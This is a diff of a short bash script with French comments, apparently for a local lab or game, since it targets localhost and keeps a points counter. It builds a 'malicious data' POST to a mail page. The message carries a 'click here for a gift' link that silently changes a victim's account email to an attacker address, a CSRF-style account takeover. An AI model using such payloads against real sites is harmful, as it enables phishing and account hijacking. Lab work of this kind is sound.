@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # URL de la page qui gère l'envoi de mails
-URL="http://localhost:2024/functions/user/mail.php"
+URL="http://localhost:2024/pages/user/send_email.php"
 
 # Données malveillantes
-DATA="receiver_emails=hacker@gmail.com&title=Bravo&content=<a href='https://www/functions/user/mail.php?id=3&new_email=hacker2@gmail.com'>Cliquez ici pour un cadeau!</a>&send_email=1"
+DATA="send_email=1&receiver_emails=hacker@gmail.com&title=WWHEATETGSAGSHDFIGASHRGAIWRHGAWRIGH&content=<a href='/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1'>Cliquez ici pour un cadeau!</a>"
 
 # Points initiaux
 points=2000
